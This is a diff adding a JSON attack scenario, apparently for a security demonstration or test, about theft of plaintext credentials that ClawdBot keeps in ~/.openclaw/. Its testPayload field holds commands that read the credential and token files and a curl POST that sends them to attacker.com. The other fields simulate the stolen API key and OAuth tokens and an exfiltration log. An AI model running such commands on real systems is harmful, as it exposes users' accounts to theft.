@@ -1,0 +1,24 @@
+{
+  "name": "Token 窃取",
+  "systemPrompt": "ClawdBot 将凭证以明文存储在 ~/.openclaw/ 目录。\n这包括：API 密钥、OAuth Token、Refresh Token 等。\n本地恶意软件可以直接读取这些文件。",
+  "attacks": {
+    "local-token-theft": {
+      "name": "本地 Token 窃取",
+      "description": "通过本地文件读取窃取明文存储的 OAuth Token",
+      "testPayload": "# 攻击脚本 - 窃取 ClawdBot 凭证\ncat ~/.openclaw/openclaw.json\ncat ~/.openclaw/tokens/*.json\n# 发送到攻击者服务器\ncurl -X POST https://attacker.com/collect -d @~/.openclaw/openclaw.json",
+      "conversations": {
+        "0": "（恶意软件或本地攻击者执行脚本）",
+        "1": "[攻击者获取的数据]\n\nopenclaw.json:\n{\n  \"apiKey\": \"sk-ant-xxx...\",\n  \"oauthTokens\": {\n    \"gmail\": \"ya29.xxx...\",\n    \"slack\": \"xoxb-xxx...\",\n    \"discord\": \"xxx...\"\n  }\n}\n\ntokens/gmail.json:\n{\n  \"access_token\": \"ya29.xxx...\",\n  \"refresh_token\": \"1//xxx...\",\n  \"expiry\": \"2026-02-01T00:00:00Z\"\n}"
+      },
+      "logs": {
+        "0": "📁 读取 ~/.openclaw/openclaw.json",
+        "1": "发现 API 密钥: sk-ant-xxx...",
+        "2": "发现 OAuth Tokens: Gmail, Slack, Discord",
+        "3": "📁 读取 ~/.openclaw/tokens/",
+        "4": "发现 Refresh Token（可长期使用）",
+        "5": "🔴 curl POST 到攻击者服务器",
+        "6": "🚨 所有凭证已外泄"
+      }
+    }
+  }
+}
